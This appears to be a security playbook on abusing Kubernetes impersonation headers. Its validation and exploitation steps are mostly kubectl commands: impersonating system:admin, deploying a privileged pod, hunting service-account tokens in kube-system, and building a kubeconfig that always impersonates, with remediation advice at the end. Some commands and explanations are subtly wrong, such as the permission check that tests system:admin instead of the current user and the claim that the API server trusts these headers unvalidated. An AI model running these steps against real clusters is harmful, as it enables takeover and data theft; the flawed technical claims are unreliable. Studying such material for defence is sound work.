
# Kubernetes Impersonation Header Injection Vulnerability

## 1. Overview

### Attack Vector Description

Impersonation header injection attacks in Kubernetes allow a malicious user with sufficient permissions to act as another user, group, or service account by injecting impersonation headers into their API requests. This effectively bypasses authentication and authorization controls, granting the attacker the privileges of the impersonated entity. The attacker modifies the `kubectl` configuration or craft raw HTTP requests to include headers such as `Impersonate-User`, `Impersonate-Group`, and `Impersonate-Uid`.

### Potential Impact and Consequences

Successful exploitation can lead to complete cluster compromise. The attacker gains the privileges of the impersonated user or service account, enabling them to:

*   **Data Breach:** Access sensitive data within the cluster.
*   **Denial of Service:** Disrupt critical services.
*   **Lateral Movement:** Pivot to other resources and services.
*   **Privilege Escalation:** Escalate privileges further if the impersonated user has higher permissions.
*   **Code Execution:** Deploy malicious code and applications.

### Risk Level Assessment

**Critical**

### Technical Explanation

Kubernetes API server uses the impersonation headers to determine the identity of the request initiator *after* initial authentication. If a user has the `impersonate` verb on a resource, they are authorized to use these headers. However, misconfigurations in RBAC or insufficient access control validation can lead to unintended impersonation capabilities being granted to malicious users.  The API server trusts these headers without fully validating the context in which they are provided, especially when the source of the request is not thoroughly vetted.

### Prerequisites and Conditions Needed

*   **Kubernetes Cluster:** A running Kubernetes cluster is required.
*   **kubectl:** `kubectl` CLI tool configured to interact with the cluster.
*   **User with `impersonate` Permissions:**  A user or service account with the `impersonate` verb on users, groups, or service accounts is needed to initiate the attack.  Often this is granted via roles such as `cluster-admin` or roles with wildcard resources.
*   **Target User/Group/Service Account:** Knowledge of a target user, group, or service account's name, ID, or other identifying information is helpful.  This can be enumerated prior to launching this attack, or guessed.
*   **Network Access:** Network access to the Kubernetes API server (typically port 6443 or 443).

## 2. Validation and Exploitation Steps

### Step 1: Check Current User's Permissions

First, identify the user context that `kubectl` is currently using and verify its permissions. This helps understand what the current user can do before attempting impersonation.

```bash
kubectl config current-context
```

**Explanation:** This command displays the currently configured context in your `kubectl` configuration, effectively showing which cluster and user you're currently authenticating as.

**Expected Output:** A context name, e.g., `minikube`.

```bash
kubectl auth can-i impersonate users/attacker-user --as system:admin
```

**Explanation:** Use `kubectl auth can-i` to determine if the current user has the "impersonate" verb on the "users" resource. Change `attacker-user` to the attacker user that is in the current context. This checks if you can impersonate other users.  The `--as system:admin` option runs the command as if the user was `system:admin`.

**Expected Output:** `yes` if you have permission, `no` if you don't.

If the output is `no`, you'll need to find a user or service account with the `impersonate` verb to continue. Try a service account:

```bash
kubectl auth can-i impersonate users/attacker-user --as system:serviceaccount:kube-system:default
```

**Explanation:** Similar to the above, but checks if the service account `system:serviceaccount:kube-system:default` has `impersonate` rights on the `users` resource.

**Expected Output:** `yes` or `no`.

If none of the above checks succeed, enumerate the roles and rolebindings on the cluster to identify any that grant `impersonate` permissions. This process is beyond the scope of this document, but tools like `kube-hunter` can automate this process.  If no `impersonate` privileges are found, exploitation cannot continue.  Otherwise, replace the commands using the appropriate username or service account where appropriate.

### Step 2:  Attempt Impersonation using kubectl

Now, attempt to impersonate a privileged user (e.g., `system:admin`) using `kubectl`.

```bash
kubectl get pods --as system:admin
```

**Explanation:** This command attempts to retrieve all pods in the cluster while impersonating the `system:admin` user.  `--as` flag instructs `kubectl` to add the `Impersonate-User` header to the API request.

**Expected Output:**
*   **Success (Vulnerable):** If the command succeeds and returns a list of pods, the impersonation attack is successful. The cluster is vulnerable.
*   **Failure (Not Vulnerable):** If the command fails with an authorization error or similar, the impersonation is not working, indicating tighter RBAC controls are in place, or the user does not have impersonation rights.

If you get an error, examine the error message carefully.  RBAC errors usually indicate that you don't have permission to get pods *as* `system:admin`, but it confirms that the impersonation attempt was made.  That is still a problem.

### Step 3:  Further Exploitation (If Impersonation is Successful)

If the previous step succeeds, you can perform various actions as the impersonated user.  For example, try creating a privileged pod:

```bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: privileged-container
    image: ubuntu
    securityContext:
      privileged: true
    command: ["sleep", "3600"]
EOF
```

**Explanation:**  This command attempts to create a pod with `privileged: true` in the security context.  This often requires `cluster-admin` privileges.  Since you are impersonating `system:admin`, if successful, this means you have effectively bypassed authorization controls.  Note that this command assumes you are still impersonating `system:admin` using the `--as` parameter from the previous step.  If not, you can create a kubeconfig as described below.

**Expected Output:**
*   **Success (Vulnerable):** The pod is created successfully, confirming the impersonation has granted full control.
*   **Failure (Potentially Less Vulnerable):** The pod creation fails, possibly due to admission controllers preventing the creation of privileged pods even for `system:admin`. This reduces, but doesn't eliminate, the vulnerability.

### Step 4:  Creating a kubeconfig file for sustained impersonation

Using the command-line `--as` option for every command becomes cumbersome and can be missed. To have `kubectl` consistently impersonate the target user, create a dedicated kubeconfig file.  First, obtain the current cluster information:

```bash
kubectl config view --minify -o yaml > current-cluster.yaml
```

**Explanation:** Saves your currently configured cluster information to a file, minus any authentication information.

**Expected output:** A YAML file named `current-cluster.yaml` containing cluster settings.

Now, create a new context with impersonation:

```bash
cat <<EOF > impersonation-config.yaml
apiVersion: v1
kind: Config
preferences: {}

clusters:
- cluster:
    server: <YOUR_API_SERVER_URL>  # Replace with your cluster's API server URL
    certificate-authority-data: <YOUR_CERTIFICATE_AUTHORITY_DATA> #Replace with your cluster's CA data. Optional, can omit if you can't find this.
  name: impersonation-cluster

users:
- name: impersonation-user
  user:
    token: <A_VALID_TOKEN_FOR_THE_ATTACKER_USER>  #Replace with the token for the attacker user.

contexts:
- context:
    cluster: impersonation-cluster
    user: impersonation-user
    namespace: default
  name: impersonation-context

current-context: impersonation-context
EOF
```

```bash
KUBECONFIG=impersonation-config.yaml kubectl config set-credentials impersonation-user --token=<A_VALID_TOKEN_FOR_THE_ATTACKER_USER>
KUBECONFIG=impersonation-config.yaml kubectl config set-cluster impersonation-cluster --server=<YOUR_API_SERVER_URL> --certificate-authority-data=<YOUR_CERTIFICATE_AUTHORITY_DATA> --embed-certs=true

KUBECONFIG=impersonation-config.yaml kubectl config set-context impersonation-context --cluster=impersonation-cluster --user=impersonation-user --namespace=default
KUBECONFIG=impersonation-config.yaml kubectl config use-context impersonation-context

KUBECONFIG=impersonation-config.yaml kubectl config set-credentials impersonation-user --as=system:admin

export KUBECONFIG=impersonation-config.yaml
```

**Explanation:**
*   The first block creates a `impersonation-config.yaml` file. **Replace `<YOUR_API_SERVER_URL>` and `<YOUR_CERTIFICATE_AUTHORITY_DATA>` with your cluster's API server URL and certificate authority data, respectively.** The cluster details can be found in your original `kubectl config view` output.  The `<A_VALID_TOKEN_FOR_THE_ATTACKER_USER>` is needed to initially authenticate and make subsequent impersonation requests. The `kubectl get secrets` or `kubectl describe serviceaccount default -n kube-system` can be helpful for finding an initial token.
*   The `kubectl config` commands configure the new kubeconfig, including setting the cluster, user, and context.
*   `kubectl config set-credentials impersonation-user --as=system:admin` tells `kubectl` to *always* add the `Impersonate-User: system:admin` header when using this context.
*   Finally, `export KUBECONFIG=impersonation-config.yaml` sets the `KUBECONFIG` environment variable, making `kubectl` use the new configuration.

**Expected Output:** The `kubectl config` commands should succeed without errors.

Now you can run commands as if you were always `system:admin`:

```bash
kubectl get pods
```

**Explanation:** This command now retrieves pods *as* `system:admin` without requiring the `--as` flag.

**Expected Output:** A list of pods, confirming you are operating as `system:admin`.

**Alternative approaches:**

*   Instead of using `kubectl config`, you can craft raw HTTP requests to the Kubernetes API server with the `Impersonate-User`, `Impersonate-Group`, and `Impersonate-Uid` headers. This requires deeper knowledge of the Kubernetes API and authentication mechanisms.
*   Using `kubectl proxy`, you can intercept and modify requests to inject impersonation headers.

### Step 5: Clean up

After confirming the vulnerability, reset the `KUBECONFIG` environment variable and delete the created kubeconfig file.

```bash
unset KUBECONFIG
rm impersonation-config.yaml
```

**Explanation:** This restores your original `kubectl` configuration.

## Remediation Recommendations

1.  **Least Privilege:**  Adhere to the principle of least privilege when assigning RBAC roles.  Avoid granting `impersonate` permissions unless absolutely necessary.
2.  **Restrict Impersonation Scope:**  If `impersonate` permissions are required, scope them to specific resources, users, or groups.  Avoid using wildcard resources (`*`) in role bindings that grant `impersonate`.
3.  **Admission Controllers:** Implement admission controllers to validate and restrict the use of impersonation headers.  These controllers can enforce policies that prevent unauthorized impersonation.
4.  **Audit Logging:** Enable audit logging to track impersonation attempts. Regularly review audit logs for suspicious activity.
5.  **Review RBAC Configuration:** Periodically review and audit your RBAC configuration to identify potential vulnerabilities.
6.  **Regular Kubernetes Upgrades:** Keep your Kubernetes cluster up to date with the latest security patches.

By implementing these recommendations, you can significantly reduce the risk of impersonation header injection attacks in your Kubernetes cluster.
